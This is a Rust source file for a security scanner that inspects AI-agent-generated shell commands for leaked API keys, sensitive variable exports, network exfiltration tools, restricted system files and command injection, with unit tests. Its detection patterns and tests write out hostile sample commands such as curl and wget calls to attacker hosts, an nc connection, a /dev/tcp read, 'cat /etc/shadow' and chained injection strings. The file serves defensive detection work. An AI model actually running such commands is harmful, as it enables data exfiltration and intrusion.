//! @docs ARCHITECTURE:VulnerabilityScanning
//!
//! ### AI Context Alignment
//! - **Subsystem**: Sovereign Engine / Security & Governance / scanner
//!
//! ### ⚠️ Invariants & Non-Negotiables
//! - `[Structural]` Type-safe state handling and bounded execution without unhandled panics.
//!
//! ### 🔍 Debugging & Observability
//! - **Local Errors**: none
//! - **Telemetry Targets**: `[Security]`, `[scanner]`
//! - **Witness Tests**: none declared

use crate::secret_redactor::SecretRedactor;
use regex::Regex;
use std::sync::{Arc, LazyLock};

/// Pre-compiled secret detection patterns (GAP-QUAL-03: avoid recompilation per scan).
static SECRET_PATTERNS: LazyLock<Vec<(Regex, &'static str)>> = LazyLock::new(|| {
    vec![
        // Anthropic Claude API Keys (specific sk-ant- prefix)
        (
            Regex::new(r"(?i)sk-ant-[a-zA-Z0-9_-]{32,128}").unwrap(),
            "Anthropic API Key",
        ),
        // OpenAI API Keys (legacy 48-char, project sk-proj-, service accounts)
        (
            Regex::new(r"(?i)sk-(?:proj-|svcacct-|admin-)?[a-zA-Z0-9_-]{32,128}").unwrap(),
            "OpenAI API Key",
        ),
        // Google Cloud / Gemini API Keys
        (
            Regex::new(r"(?i)AIza[0-9A-Za-z-_]{35}").unwrap(),
            "Google API Key",
        ),
        // GitHub Tokens (personal, fine-grained, OAuth, App)
        (
            Regex::new(r"(?i)(?:ghp|gho|ghu|ghs|ghr)_[a-zA-Z0-9]{36,255}").unwrap(),
            "GitHub Access Token",
        ),
        (
            Regex::new(r"(?i)github_pat_[a-zA-Z0-9_]{82}").unwrap(),
            "GitHub Fine-Grained Personal Access Token",
        ),
        // AWS Access Key ID
        (
            Regex::new(r"\b(?:AKIA|ABIA|ACCA|ASIA)[0-9A-Z]{16}\b").unwrap(),
            "AWS Access Key ID",
        ),
        // Slack Tokens
        (
            Regex::new(r"(?i)xox[pborsa]-[a-zA-Z0-9-]{10,72}").unwrap(),
            "Slack Token",
        ),
        // Stripe API Keys
        (
            Regex::new(r"(?i)(?:sk|rk)_(?:live|test)_[a-zA-Z0-9]{24,99}").unwrap(),
            "Stripe API Key",
        ),
        // Hugging Face Tokens
        (
            Regex::new(r"(?i)hf_[a-zA-Z0-9]{34,40}").unwrap(),
            "Hugging Face Token",
        ),
        // SendGrid API Key
        (
            Regex::new(r"(?i)SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}").unwrap(),
            "SendGrid API Key",
        ),
        // Square Access Token
        (
            Regex::new(r"(?i)sq0atp-[a-zA-Z0-9_-]{22}").unwrap(),
            "Square Access Token",
        ),
        // JSON Web Token (JWT)
        (
            Regex::new(r"(?i)eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}")
                .unwrap(),
            "JSON Web Token (JWT)",
        ),
        // Private Key PEM Headers
        (
            Regex::new(r"-----BEGIN (?:[A-Z0-9_-]+ )?PRIVATE KEY-----").unwrap(),
            "Private Key PEM Block",
        ),
    ]
});

/// Pre-compiled heuristic patterns for sensitive variable assignments across shells (Bash, CMD, PowerShell).
static SENSITIVE_EXPORT_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    vec![
        // Bash/Zsh: export KEY=value, declare -x KEY=value
        Regex::new(r"(?i)(?:export|declare\s+-x)\s+([A-Z0-9_]*(?:KEY|SECRET|TOKEN|PASSWORD|PASSWD|AUTH|CREDENTIAL|PRIVATE)[A-Z0-9_]*)\s*=\s*(.+)").unwrap(),
        // Windows CMD: set KEY=value
        Regex::new(r"(?i)set\s+([A-Z0-9_]*(?:KEY|SECRET|TOKEN|PASSWORD|PASSWD|AUTH|CREDENTIAL|PRIVATE)[A-Z0-9_]*)\s*=\s*(.+)").unwrap(),
        // PowerShell: $env:KEY = "value"
        Regex::new(r"(?i)\$env:([A-Z0-9_]*(?:KEY|SECRET|TOKEN|PASSWORD|PASSWD|AUTH|CREDENTIAL|PRIVATE)[A-Z0-9_]*)\s*=\s*(.+)").unwrap(),
    ]
});

/// Pre-compiled patterns for network exfiltration and restricted system file access.
static EXFIL_AND_PATH_PATTERNS: LazyLock<Vec<(Regex, &'static str)>> = LazyLock::new(|| {
    vec![
        (
            Regex::new(r"(?i)\b(?:curl|wget|socat|nc|netcat|ncat|sftp|ftp|telnet)\s+[^;\|&]+").unwrap(),
            "Network Utility / Exfiltration Tool",
        ),
        (
            Regex::new(r"(?i)/dev/tcp/[0-9a-zA-Z_.-]+/[0-9]+").unwrap(),
            "Direct /dev/tcp Network Socket",
        ),
        (
            Regex::new(r"(?i)(?:/etc/(?:passwd|shadow|sudoers|master\.passwd)|C:\\Windows\\System32\\config\\SAM)").unwrap(),
            "Restricted System File Access",
        ),
    ]
});

/// Pre-compiled injection detection patterns.
static INJECTION_PATTERNS: LazyLock<Vec<(Regex, &'static str)>> = LazyLock::new(|| {
    vec![
        (Regex::new(r";").unwrap(), "Command Concatenation (;)"),
        (Regex::new(r"&&").unwrap(), "Command Concatenation (&&)"),
        (Regex::new(r"\|\|").unwrap(), "Command Concatenation (||)"),
        (Regex::new(r"\|").unwrap(), "Pipe (|)"),
        (Regex::new(r">").unwrap(), "Output Redirection (>)"),
        (Regex::new(r"<").unwrap(), "Input Redirection (<)"),
        (Regex::new(r"\$\(").unwrap(), "Command Substitution ($())"),
        (Regex::new(r"`").unwrap(), "Command Substitution (`)"),
    ]
});

/// Result of a shell safety scan.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ScannerResult {
    /// The script appears safe and contains no detectable secrets or risks.
    Safe,
    /// The script contains a potential risk (e.g., hardcoded API key, injection, or raw export).
    /// The string contains the reason/detected pattern.
    Risky(String),
}

impl ScannerResult {
    pub fn is_safe(&self) -> bool {
        matches!(self, ScannerResult::Safe)
    }

    pub fn is_risky(&self) -> bool {
        matches!(self, ScannerResult::Risky(_))
    }

    pub fn reason(&self) -> Option<&str> {
        match self {
            ScannerResult::Safe => None,
            ScannerResult::Risky(r) => Some(r.as_str()),
        }
    }
}

/// A proactive security scanner that inspects scripts for sensitive data before execution.
///
/// ShellScanner uses both exact matching (via SecretRedactor) and heuristic patterns
/// (Regex) to detect potential secret leakages in agent-generated shell commands.
pub struct ShellScanner {
    redactor: Arc<SecretRedactor>,
}

impl ShellScanner {
    /// Creates a new security scanner with a reference to the global secret redactor.
    pub fn new(redactor: Arc<SecretRedactor>) -> Self {
        Self { redactor }
    }

    /// Mock scanner for tests
    pub fn mock() -> Self {
        Self {
            redactor: Arc::new(SecretRedactor::noop()),
        }
    }

    /// Performs a multi-phase deep scan of a command string.
    ///
    /// Identifies high-risk patterns including:
    /// - Known environment secrets from `SecretRedactor`
    /// - Standard API key / credential regex formats
    /// - Hardcoded sensitive environment variable assignments (`*KEY*`, `*SECRET*`, `*TOKEN*`, `*PASS*`)
    /// - Network exfiltration utilities (`curl`, `wget`, `/dev/tcp`) and restricted system paths
    /// - Command injection and chaining (`;`, `&&`, `||`, `|`, `>`, `<`, `$()`, `` ` ``)
    ///
    /// Returns `ScannerResult::Risky` if any pattern is detected.
    #[tracing::instrument(skip(self, input), name = "security::shell_scan")]
    pub fn scan(&self, input: &str) -> ScannerResult {
        // 0. Pre-normalize input against evasion attempts
        let normalized = super::normalizer::normalize_text(input);

        // 1. Check against the redactor's registered environment secrets
        if self.redactor.contains_registered_secret(input)
            || self.redactor.contains_registered_secret(&normalized)
        {
            tracing::warn!("🛡️ [Security] [scanner] Known environment secret detected in script");
            return ScannerResult::Risky("Known environment secret detected in script".to_string());
        }

        // 2. Pre-compiled regex patterns for common secret formats (Proactive detection)
        for (re, name) in SECRET_PATTERNS.iter() {
            if re.is_match(input) || re.is_match(&normalized) {
                tracing::warn!("🛡️ [Security] [scanner] Potential {} detected", name);
                return ScannerResult::Risky(format!("Potential {} detected", name));
            }
        }

        // 3. Heuristic: Look for sensitive variable assignments across Bash/CMD/PowerShell
        for re in SENSITIVE_EXPORT_PATTERNS.iter() {
            let check_target = |text: &str| -> Option<String> {
                if let Some(caps) = re.captures(text) {
                    let var_name = caps.get(1).map(|m| m.as_str()).unwrap_or("");
                    let val = caps.get(2).map(|m| m.as_str().trim()).unwrap_or("");
                    // Strip enclosing quotes if present
                    let unquoted = val
                        .strip_prefix('"')
                        .and_then(|s| s.strip_suffix('"'))
                        .or_else(|| val.strip_prefix('\'').and_then(|s| s.strip_suffix('\'')))
                        .unwrap_or(val)
                        .trim();

                    // If non-empty literal value (not variable expansion like $VAR or %VAR%)
                    if !unquoted.is_empty()
                        && !unquoted.starts_with('$')
                        && !unquoted.starts_with('%')
                    {
                        return Some(format!(
                            "Prohibited sensitive variable assignment detected ({})",
                            var_name
                        ));
                    }
                }
                None
            };

            if let Some(reason) = check_target(input).or_else(|| check_target(&normalized)) {
                tracing::warn!("🛡️ [Security] [scanner] {}", reason);
                return ScannerResult::Risky(reason);
            }
        }

        // 4. Exfiltration and restricted system file access patterns
        for (re, name) in EXFIL_AND_PATH_PATTERNS.iter() {
            if re.is_match(input) || re.is_match(&normalized) {
                tracing::warn!("🛡️ [Security] [scanner] {}", name);
                return ScannerResult::Risky(format!("Potential {} detected", name));
            }
        }

        // 5. Injection: Look for command concatenation or redirection (pre-compiled patterns)
        let collapsed = super::normalizer::normalize_and_collapse_whitespace(input);
        for (re, name) in INJECTION_PATTERNS.iter() {
            if re.is_match(input) || re.is_match(&normalized) || re.is_match(&collapsed) {
                tracing::warn!(
                    "🛡️ [Security] [scanner] Command Injection / Chaining: {}",
                    name
                );
                return ScannerResult::Risky(format!(
                    "Potential Command Injection or Redirection detected: {}",
                    name
                ));
            }
        }

        ScannerResult::Safe
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_scanner_risks() {
        let scanner = ShellScanner::mock();

        // 1. Safe simple commands
        assert_eq!(scanner.scan("ls -la"), ScannerResult::Safe);
        assert_eq!(scanner.scan("cargo build"), ScannerResult::Safe);

        // 2. OpenAI Keys (Legacy & Project sk-proj-)
        let openai_legacy = format!("sk-{}", "123456789012345678901234567890123456789012345678");
        assert!(scanner
            .scan(&format!("echo {}", openai_legacy))
            .reason()
            .unwrap()
            .contains("OpenAI"));

        let openai_proj = format!(
            "sk-proj-{}",
            "abcdef1234567890abcdef1234567890abcdef1234567890abcdef"
        );
        assert!(scanner
            .scan(&format!("KEY={}", openai_proj))
            .reason()
            .unwrap()
            .contains("OpenAI"));

        // 3. Anthropic Key
        let anthropic_key = format!(
            "sk-ant-{}",
            "abcdef1234567890abcdef1234567890abcdef1234567890"
        );
        assert!(scanner
            .scan(&anthropic_key)
            .reason()
            .unwrap()
            .contains("Anthropic"));

        // 4. Google API Key
        let google_key = format!("AIzaSyA{}", "12345678901234567890123456789012");
        assert!(scanner
            .scan(&format!("key = {}", google_key))
            .reason()
            .unwrap()
            .contains("Google"));

        // 5. GitHub Token (Legacy ghp_ and Fine-Grained github_pat_)
        let github_token = format!("ghp_{}", "123456789012345678901234567890123456");
        assert!(scanner
            .scan(&github_token)
            .reason()
            .unwrap()
            .contains("GitHub"));

        let github_pat = format!(
            "github_pat_{}",
            "11AAAAAAA0000000000000_1234567890123456789012345678901234567890123456789012345678901234"
        );
        assert!(scanner
            .scan(&github_pat)
            .reason()
            .unwrap()
            .contains("GitHub"));

        // 6. AWS Access Key
        let aws_key = "AKIAIOSFODNN7EXAMPLE";
        assert!(scanner
            .scan(&format!("AWS_ACCESS_KEY_ID={}", aws_key))
            .reason()
            .unwrap()
            .contains("AWS"));

        // 7. JWT Token
        let jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
        assert!(scanner
            .scan(&format!("token={}", jwt))
            .reason()
            .unwrap()
            .contains("JWT"));

        // 8. PEM Private Key
        let pem =
            "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----";
        assert!(scanner.scan(pem).reason().unwrap().contains("Private Key"));

        // 9. Command Injections
        assert!(scanner
            .scan("ls -la; whoami")
            .reason()
            .unwrap()
            .contains("Command Concatenation"));
        assert!(scanner
            .scan("whoami && echo pwned")
            .reason()
            .unwrap()
            .contains("Command Concatenation"));
        assert!(scanner
            .scan("echo sensitive > secret.txt")
            .reason()
            .unwrap()
            .contains("Redirection"));
        assert!(scanner
            .scan("echo $(whoami)")
            .reason()
            .unwrap()
            .contains("Substitution"));
    }

    #[test]
    fn test_benign_exports_allowed() {
        let scanner = ShellScanner::mock();

        // Benign environment variable assignments must NOT be flagged
        assert_eq!(scanner.scan("export PATH=/usr/bin"), ScannerResult::Safe);
        assert_eq!(
            scanner.scan("export PATH=\"/usr/local/bin:/usr/bin\""),
            ScannerResult::Safe
        );
        assert_eq!(scanner.scan("export TZ=UTC"), ScannerResult::Safe);
        assert_eq!(
            scanner.scan("export NODE_ENV=production"),
            ScannerResult::Safe
        );
        assert_eq!(scanner.scan("set RUST_LOG=info"), ScannerResult::Safe);
        assert_eq!(scanner.scan("$env:EDITOR = 'nano'"), ScannerResult::Safe);
        assert_eq!(
            scanner.scan("export MY_VAR=$EXISTING_VAR"),
            ScannerResult::Safe
        );
    }

    #[test]
    fn test_quoted_secret_exports_flagged() {
        let scanner = ShellScanner::mock();

        // Quoted secret assignments must be flagged across Bash, CMD, and PowerShell
        assert!(scanner
            .scan("export DB_PASSWORD=\"hunter2\"")
            .reason()
            .unwrap()
            .contains("sensitive variable assignment"));

        assert!(scanner
            .scan("declare -x API_SECRET='my_hardcoded_secret'")
            .reason()
            .unwrap()
            .contains("sensitive variable assignment"));

        assert!(scanner
            .scan("set AUTH_TOKEN=secret_val_123")
            .reason()
            .unwrap()
            .contains("sensitive variable assignment"));

        assert!(scanner
            .scan("$env:SIGNING_KEY = \"super_secret_signing_key\"")
            .reason()
            .unwrap()
            .contains("sensitive variable assignment"));
    }

    #[test]
    fn test_network_exfil_and_restricted_paths() {
        let scanner = ShellScanner::mock();

        // Network exfiltration utilities
        assert!(scanner
            .scan("curl http://attacker.com/leak")
            .reason()
            .unwrap()
            .contains("Network Utility"));
        assert!(scanner
            .scan("wget https://malicious.site/payload")
            .reason()
            .unwrap()
            .contains("Network Utility"));
        assert!(scanner
            .scan("nc 10.0.0.1 4444")
            .reason()
            .unwrap()
            .contains("Network Utility"));

        // Direct /dev/tcp socket
        assert!(scanner
            .scan("cat /dev/tcp/10.0.0.1/8080")
            .reason()
            .unwrap()
            .contains("/dev/tcp"));

        // Restricted system file
        assert!(scanner
            .scan("cat /etc/shadow")
            .reason()
            .unwrap()
            .contains("Restricted System File"));
    }

    #[test]
    fn test_scanner_evasion() {
        let scanner = ShellScanner::mock();

        // 1. Spaced injection bypass attempt ("& &" collapses to "&&")
        assert!(scanner
            .scan("whoami   & &   echo pwned")
            .reason()
            .unwrap()
            .contains("Command Concatenation"));

        // 2. Homoglyph injection bypass attempt ("е" is Cyrillic \u{0435} in "export")
        // Uses a generic sensitive variable name (not relying on sk- regex format)
        let homoglyph_export = "\u{0435}xport DB_PASSWORD=my_hardcoded_passwd";
        assert!(scanner
            .scan(homoglyph_export)
            .reason()
            .unwrap()
            .contains("sensitive variable assignment"));

        // 3. Base64 payload without literal operator in raw input
        // "d2hvYW1pJiZlY2hv" decodes to "whoami&&echo"
        assert!(scanner
            .scan("eval d2hvYW1pJiZlY2hv")
            .reason()
            .unwrap()
            .contains("Command Concatenation"));
    }

    #[test]
    fn test_real_redactor_integration() {
        let redactor = Arc::new(SecretRedactor::with_secrets(vec![
            "super_secret_runtime_token_999".to_string(),
        ]));
        let scanner = ShellScanner::new(redactor);

        assert!(scanner
            .scan("echo super_secret_runtime_token_999")
            .reason()
            .unwrap()
            .contains("Known environment secret"));
    }
}
